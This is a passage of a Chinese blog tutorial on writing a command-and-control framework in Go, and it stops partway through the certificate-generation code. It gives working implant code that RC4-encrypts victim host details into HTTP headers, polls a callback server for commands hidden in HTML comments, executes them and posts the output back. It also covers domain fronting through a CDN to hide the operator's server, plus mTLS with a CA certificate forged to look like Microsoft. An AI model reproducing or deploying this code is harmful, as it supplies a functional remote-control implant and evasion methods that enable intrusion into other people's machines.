</span><br><span class="line">    InternalIP:  <span class="type">int32</span>(utils.GetInternalIp()),  </span><br><span class="line">    Computer:    utils.GetComputerName(),  </span><br><span class="line">    Username:    utils.GetUsername(),  </span><br><span class="line">    ProcessName: utils.GetProcessName(),  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HttpGet方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HttpGet</span><span class="params">(metaData []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    url := fmt.Sprintf(<span class="string">&quot;http://%s%s&quot;</span>, beaconProfile.CallBackAddress, beaconProfile.URI)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ====== RC4加密 ======    </span></span><br><span class="line">    rc4_key := beaconProfile.EncryptKey  </span><br><span class="line">    encryptedMetaData, err := utils.RC4Crypt(metaData, rc4_key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// ====== base64url 编码 ======    </span></span><br><span class="line">    metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ====== 设置到请求头 ======    </span></span><br><span class="line">    cookieValue := beaconProfile.HBPrefix + metaDataB64  </span><br><span class="line">  </span><br><span class="line">    req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Request error:&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    req.Header.Set(beaconProfile.HBHeader, cookieValue)  </span><br><span class="line">    req.Header.Set(<span class="string">&quot;User-Agent&quot;</span>, beaconProfile.UserAgent)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ====== 发送HTTP GET请求 ======    </span></span><br><span class="line">    client := &amp;http.Client&#123;&#125;  </span><br><span class="line">    resp, err := client.Do(req)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;HTTP error:&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()  </span><br><span class="line">    respBytes, _ := io.ReadAll(resp.Body)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Status:&quot;</span>, resp.StatusCode)  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Decrypted Response:&quot;</span>, <span class="type">string</span>(respBytes))  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;http response error:&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> respBytes, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>HttpGet</code> 把传入的 <code>metaData</code> 先用 RC4 加密→Base64URL编码→塞进指定 HTTP请求头→发GET请求→读取并原样返回响应体，用于 Beacon上线&#x2F;心跳&#x2F;拉取任务时把主机信息隐写在请求头Header里回传给C2服务器。</p>
<p>这就是拉取后，Server返回给Beacon的html页面</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/11-28-26-c2bc30fe89b40efe427b7b2a226de575-20250907112826-17596d.png"></p>
<p>HttpPost方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HttpPost</span><span class="params">(metaData []<span class="type">byte</span>, body []<span class="type">byte</span>)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    url := fmt.Sprintf(<span class="string">&quot;http://%s%s&quot;</span>, beaconProfile.CallBackAddress, beaconProfile.URI)  </span><br><span class="line">    rc4Key := beaconProfile.EncryptKey  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. 加密 metaData    </span></span><br><span class="line">    encryptedMetaData, err := utils.RC4Crypt(metaData, rc4Key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || encryptedMetaData == <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;rc4 encrypt metaData error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)  </span><br><span class="line">    cookieValue := beaconProfile.HBPrefix + metaDataB64  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. 加密 body    </span></span><br><span class="line">    encryptedBody, err := utils.RC4Crypt(body, rc4Key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || encryptedBody == <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;rc4 encrypt body error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. 构造请求  </span></span><br><span class="line">    req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, url, bytes.NewReader(encryptedBody))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;request error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    req.Header.Set(beaconProfile.HBHeader, cookieValue)  </span><br><span class="line">    req.Header.Set(<span class="string">&quot;User-Agent&quot;</span>, beaconProfile.UserAgent)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. 发送  </span></span><br><span class="line">    client := &amp;http.Client&#123;&#125;  </span><br><span class="line">    resp, err := client.Do(req)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;http do error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// 只有 resp != nil 才需要关闭  </span></span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 5. 读取响应  </span></span><br><span class="line">    respBytes, err := io.ReadAll(resp.Body)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;read response error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> resp.StatusCode != http.StatusOK &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;Status: %d\nDecrypted Response: %s\n&quot;</span>,  </span><br><span class="line">          resp.StatusCode, <span class="type">string</span>(respBytes))  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>HttpPost</code> 把 <code>metaData</code> 和 <code>body</code> 分别 RC4 加密→Base64URL 后，前者塞进指定请求头、后者作为POST密文体，用于 Beacon 回传命令结果或大型数据。最后会得到响应，响应码只有404（pageError）或者200（成功）。</p>
<p>main和runCommand方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       AssemblyBuff []<span class="type">byte</span>  </span><br><span class="line">       err          <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">    metaData, err := json.Marshal(heartBeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;json marshal error:%v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       <span class="comment">// 发送HTTP GET请求  </span></span><br><span class="line">       AssemblyBuff, err = HttpGet(metaData)  </span><br><span class="line">       <span class="built_in">println</span>(<span class="type">string</span>(AssemblyBuff))  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 解析响应，提取加密后的命令  </span></span><br><span class="line">       encryptedtext := regexp.MustCompile(<span class="string">`&lt;!--\s*(.*?)\s*--&gt;`</span>)  </span><br><span class="line">       matches := encryptedtext.FindSubmatch(AssemblyBuff)  </span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(matches) &lt; <span class="number">2</span> &#123;  </span><br><span class="line">          <span class="built_in">println</span>(<span class="string">&quot;No command found in response&quot;</span>)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 去除空格，解密命令  </span></span><br><span class="line">       encryptedCommand := strings.TrimSpace(<span class="type">string</span>(matches[<span class="number">1</span>]))  </span><br><span class="line">       command, err := utils.RC4Crypt([]<span class="type">byte</span>(encryptedCommand), beaconProfile.EncryptKey) <span class="comment">// 结果：ipconfig  </span></span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;rc4 crypt error:%v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="built_in">println</span>(<span class="string">&quot;Command:&quot;</span>, command)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 执行命令并返回结果  </span></span><br><span class="line">       result, err := runCommand(<span class="type">string</span>(command))  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Printf(<span class="string">&quot;run command error:%v&quot;</span>, err)  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="built_in">println</span>(result)  </span><br><span class="line">       HttpPost(metaData, []<span class="type">byte</span>(result))  </span><br><span class="line">       time.Sleep(time.Duration(heartBeat.Sleep+heartBeat.Jitter) * time.Second)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runCommand</span><span class="params">(cmdLine <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> cmd *exec.Cmd  </span><br><span class="line">    <span class="comment">// 按空格拆成 argv，支持带参数  </span></span><br><span class="line">    args := strings.Fields(cmdLine)  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;empty command&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    cmd = exec.Command(args[<span class="number">0</span>], args[<span class="number">1</span>:]...)  </span><br><span class="line">    out, err := cmd.CombinedOutput()  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(out), err  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>main</code> 方法是一个典型的循环拉取任务（轮询，即Beacon模式），执行任务，返回结果的结构，在CS的Beacon的源码中它也是这样定义。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/11/20-01-51-b3fd3be299aee747a2034b6aaf2c2595-20250911200150-2aff57.png"></p>
<p><code>main</code> 函数的功能具体来说就是通过 <code>HttpGet</code> 方法去拉取任务，使用正则提取html中加密的任务数据，解密数据，然后调用 <code>runCommand</code> 去执行任务（<strong>本文中只能执行cmd命令</strong>），最后将执行的结果用 <code>HttpPost</code> 方法回传给Server。</p>
<p>获取metadata、RC4加密的等工具函数就不过多介绍了，各位师傅可以去github查阅源码。</p>
<h2 id="1-3-流量分析"><a href="#1-3-流量分析" class="headerlink" title="1.3 流量分析"></a>1.3 流量分析</h2><p>最后来看看流量分析</p>
<p>Beacon以GET方式请求任务</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-55-19-b8929b39fcd26efe41a8ad725031c686-20250907125518-f24ef8.png"></p>
<p>Server返回任务数据</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-55-51-04b0028889dd0fff9e18b678ea9db7c4-20250907125550-da1ddd.png"></p>
<p>Beacon回传执行结果</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-56-25-ffaae8c9f976d2de09e54ada89c87849-20250907125625-332032.png"></p>
<p>Server成功接收，返回响应码200</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/12-57-13-7d65ced264fcb6c3e43c1e5bf7913db0-20250907125712-d55365.png"></p>
<h2 id="1-4-域前置"><a href="#1-4-域前置" class="headerlink" title="1.4 域前置"></a>1.4 域前置</h2><p>域前置（Domain Fronting）是一种利用HTTPS和CDN的网络技术，其核心理念是在网络通信中隐藏真实的通信目的地，此项技术可被用于隐藏vps的真实公网IP地址。</p>
<p>很多云服务厂商都会提供CDN加速服务，这里为了方便我就在阿里云上开通CDN服务，毕竟也不要钱，当然在实战中不推荐使用国内的云厂商，道理大家都懂吧？</p>
<p>网上有很多参考资料，我感觉没有必要再这里再写详细步骤了？看我给的这两篇参考资料再加上阿里云的官方文档就没问题了</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12070">C2隐匿-云函数&amp;域前置-先知社区</a></li>
<li><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cqm7qf90lnec5jjug7b0">流量对抗-域前置基础设施搭建 | 长亭百川云</a></li>
</ol>
<p>所以我们直入主题，看看加上域前置技术后的流量是怎么样的吧。</p>
<p>修改beacon.go中的服务器的 <code>CallBackAddress</code> 字段的值填写为 <code>CNAME</code> 记录域名，本文中就是 <code>www.abcplus.xyz</code>， 它可以将一个域名指向另一个域名。举个例子就是 <code>www.abcplus.xyz（记录域名）</code> -&gt; <code>www.abcplus.xyz.queniuaa.com（记录值，配置CND时自动生成）</code>，CDN节点再根据<strong>回源规则</strong>把流量转给你的VPS。</p>
<p>来点真实的，直接上流量分析！</p>
<p>首先Beacon向DNS服务器发起A记录查询<code>www.abcplus.xyz</code> 对应的IP是多少，随后DNS服务器返回查询ip为 <code>155.102.4.176</code>。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-01-22-724d8e5a8cf0e09d90ab0e1afa894af6-20250912210122-6a16fb.png"></p>
<p>很明显这不是我的vps的ip地址，不信？就测一下。<code>155.102.4.176</code> 是阿里云 CDN 的边缘节点，不是源站。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-08-17-8dd7f3f481a8220d4e2aa3736f289ae8-20250912210817-d19b7d.png"></p>
<p><strong>看看wireshark流量包</strong><br>第31-33号包：标准的TCP三次握手。<br>第34-34号包：随后Beacon以<code>GET</code>方式访问了&#x2F;cdn-cgi&#x2F;trace，这是我们在代码中定义的上线拉取任务包的操作。<br>第35-36号包：Server返回任务数据给Beacon。<br>第37-38号包：Beacon以<code>POST</code>方式访问了&#x2F;cdn-cgi&#x2F;trace，返回执行的。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-11-53-6fc6626e54a1c9bbc80f6c807727ed28-20250912211153-77a9e2.png"></p>
<p>server接收到结果包，输出结果到控制台，没有出错就返回200响应码</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-22-14-efa83fcf54c8d09c58ba1f2cc1481382-20250912212213-4e416f.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/12/21-31-59-e711f94db6012475511c757a224a6ca9-20250912213159-6fc7b9.png"></p>
<p>如果你觉得使用HTTP不安全，你可以使用HTTPS协议，毕竟使用HTTP总感觉在裸奔，具体怎么配置CDN可以看我给的那两篇参考文章。</p>
<h1 id="二、mTLS"><a href="#二、mTLS" class="headerlink" title="二、mTLS"></a>二、mTLS</h1><h2 id="2-1-思路构建"><a href="#2-1-思路构建" class="headerlink" title="2.1 思路构建"></a>2.1 思路构建</h2><p>mTLS在标准TLS的基础上要求<strong>客户端与服务器各自出示并验证对方数字证书</strong>，实现<strong>双向身份认证</strong>，常用于零信任框架，因为在Sliver的介绍中看到了这个协议，所以就想根据Sliver的源码来分析一波mTLS在C2中的应用。</p>
<p>我们都知道（maybe？），可以通过TCP Socket实现实时信息通信长连接通道，而且每个操作系统都会提供相关的编程API，所以TCP Socket也是C2中经常出现的C2协议，在TCP的上层套一个TLS&#x2F;SSL即可完成加密通信。而mTLS只是在TLS的基础上<strong>要求client也出示其TLS证书</strong>，当然在C2中这么做的目的更多是防止防守方通过伪装TLS证书与服务器通信。但是这样并非完全安全，按照sliver的做法是将CA证书、client私钥、client证书驻留在Beacon的内存中，如果防守方能从其内存中dump出这三个凭据，也就能重复已有身份，所以我们使用mTLS的目的是进一步延缓防守方的分析速度，而非完全阻止。使用mTls协议需要简单了解一下证书的<strong>签发</strong>与<strong>验证</strong>流程。</p>
<p>看一下<strong>签发</strong>（私有PKI构建）的流程：</p>
<ol>
<li>Server生成一把私钥作为CA的私钥，CA私钥存放在Server的内存或数据库中</li>
<li>弄出一个CA证书模板</li>
<li>然后CA的私钥对CA证书签名，即自签</li>
<li>Server生成为Listener生成一对私钥和公钥</li>
<li>用CA的私钥对Listener的公钥签名，生成Listener的证书</li>
<li>Server为Beacon生成一对私钥和公钥</li>
<li>用CA的私钥对Beacon的证书签名，生成Beacon的证书</li>
</ol>
<p>再看一下<strong>验证</strong>流程，其中加粗的部分就是与TLS不同的地方。</p>
<ol>
<li>客户端连接到服务器</li>
<li>服务器出示其TLS证书</li>
<li>客户端使用内置的CA证书（相当于根证书）验证服务器的证书</li>
<li><strong>客户端出示其 TLS 证书</strong></li>
<li><strong>服务器使用内置的CA证书验证客户端的证书</strong></li>
<li><strong>服务器授予访问权限</strong></li>
<li>客户端和服务器通过加密的TCP Socket连接交换信息</li>
</ol>
<p>了解上述的知识点后，我们就可以思路构建了</p>
<p><strong>第一点：自己生成CA证书</strong>：这部分是对应<strong>签发流程</strong>的因为根本就拿不到具有公证力的CA私钥，而且也没必要，我们要使用的CA证书不是系统信任的根证书，而是完全私有的，为了构建零信任框架，它让你拥有“签发身份”的主权，所以需要妥善保管好CA私钥。</p>
<p><strong>第二点：为每一个新连接启动一个goroutine</strong>：让每条每条连接隧道“独享”一条轻量级执行流，既解耦又防阻塞，是利用Go在并发优势写C2的标配套路。</p>
<p><strong>第三点：流量分帧</strong>：这一点是针对大文件、大数据的情况。为了避免通信双方发送超长的数据导致粘包，通常的做法是发送方先发送总长度给接收方，然后接收方申请一个总长度大小的内存空间，之后再从socket读取数据，就可以避免粘包现象的出现。</p>
<p>如果你有大文件上传和下载的需求且有落地磁盘的场景，并不能直接将数据读到内存在写入到磁盘上，容易造成内存爆炸，所以在实际编程中，你就需要实现固定字节“分块”落盘。我只是在这里提上一嘴，代码只解决了粘包问题，因本文没有“分块”落盘的场景所以就没实现。</p>
<p>为什么http不需要分帧？其实不是不分，而是帧已经被协议规范做完，开发者无感，后面的很多C2协议都需要开发者自行分帧，分组（分帧、分片、分段是一个意思） 是c2中绕不开的一个核心问题。</p>
<p><strong>第五点：命令下发与结果回传</strong>：我们的下发任务和Beacon结果都是数据，可通过socket传输。</p>
<p>当Beacon成功连接到Server，就发送一个心跳包用于后续的注册操作。因为本文中是实现了一个长连接实时session会话，下发的任务会立即有执行，所以不需要任务队列存储任务数据。</p>
<p>当然此c2协议也能够实现Beacon模式，任务不立即被beacon取走，所以可以准备一个任务队列。</p>
<h2 id="2-2-代码实现"><a href="#2-2-代码实现" class="headerlink" title="2.2 代码实现"></a>2.2 代码实现</h2><h3 id="2-2-1-生成证书"><a href="#2-2-1-生成证书" class="headerlink" title="2.2.1 生成证书"></a>2.2.1 生成证书</h3><p><code>cert.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//go:build ignore  </span></span><br><span class="line"><span class="comment">// +build ignore  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/ecdsa&quot;</span>  </span><br><span class="line">    <span class="string">&quot;crypto/elliptic&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/rand&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509/pkix&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/pem&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/big&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 固定组织名  </span></span><br><span class="line"><span class="keyword">var</span> orgName = <span class="string">&quot;System Center Operations Manager&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 生成私钥和证书，并用自己的私钥签发自己的证书（自签）  </span></span><br><span class="line">    caPriv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)  </span><br><span class="line">    caTmpl := &amp;x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: <span class="built_in">new</span>(big.Int).SetBytes(randomBytes(<span class="number">20</span>)),  </span><br><span class="line">       Subject: pkix.Name&#123;  </span><br><span class="line">          Organization:  []<span class="type">string</span>&#123;orgName&#125;,  </span><br><span class="line">          Country:       []<span class="type">string</span>&#123;<span class="string">&quot;US&quot;</span>&#125;,  </span><br><span class="line">          Province:      []<span class="type">string</span>&#123;<span class="string">&quot;&quot;</span>&#125;,  </span><br><span class="line">          Locality:      []<span class="type">string</span>&#123;<span class="string">&quot;Redmond&quot;</span>&#125;, <span class="comment">// 随便写  </span></span><br><span class="line">          StreetAddress: []<span class="type">string</span>&#123;<span class="string">&quot;&quot;</span>&#125;,  </span><br><span class="line">          PostalCode:    []<span class="type">string</span>&#123;<span class="string">&quot;&quot;</span>&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       NotBefore: time.Now(), NotAfter: time.Now().AddDate(<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>),  </span><br><span class="line">       KeyUsage: x509.KeyUsageCertSign, BasicConstraintsValid: <span class="literal">true</span>,  </span><br><span class="line">       IsCA: <span class="literal">true</span>,  </span><br><span class="line">       IPAddresses: []net.IP&#123;  </span><br><span class="line">          net.IPv4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">192</span>, <span class="number">168</span>, <span class="number">3</span>, <span class="number">1</span>),  </span><br><span class="line">          net.IPv4(<span class="number">203</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">1</span>), <span class="comment">// RFC 5737 测试地址  </span></span><br><span class="line">       &#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    caCertDER, _ 